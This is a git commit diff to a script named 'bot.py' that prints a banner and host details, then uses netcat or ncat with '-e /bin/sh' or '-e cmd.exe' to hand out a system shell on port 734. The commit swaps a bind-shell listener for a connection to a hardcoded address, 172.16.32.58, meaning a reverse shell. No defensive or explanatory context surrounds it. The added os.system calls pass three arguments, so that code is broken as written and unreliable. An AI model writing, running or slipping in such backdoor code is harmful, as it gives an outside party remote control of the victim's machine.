84aaac5f83951bf2d9419b8d294416a3ba0a6ee5
kaki714 <123768052+kaki714@users.noreply.github.com>
2023-02-14 13:30:13 -0500

    Update bot.py

--- bot.py
+++ bot.py
@@ -4,12 +4,14 @@ import sysconfig
 import socket
 import fcntl
 import struct
+import subprocess
 
 
 
 def run():
     hostname=socket.gethostname()   
     IPAddr=socket.gethostbyname(hostname) 
+    iph= '172.16.32.58'
     print('')
     print(' ############### # # # ##############')
     print(' ####### ###### # #  # # ####### ####')
@@ -21,9 +23,11 @@ def run():
     if "Linux" in platform.system():
         print('Linux: ', sysconfig.get_platform()) 
         print(' IpAddress: ', IPAddr)
-        os.system( 'nc -lvp 734 -e /bin/sh')
+        #os.system( 'nc -lvp 734 -e /bin/sh')
+        os.system('nc',iph, '734 -e /bin/sh')
     elif "Windows" in platform.system():
         print('Windows: ', sysconfig.get_platform()) 
         print('Address ip: ', IPAddr)
-        os.system('ncat -lvp 734 -e cmd.exe')
+        #os.system('ncat -lvp 734 -e cmd.exe')
+        os.system('ncat', iph ,'734 -e cmd.exe')
     
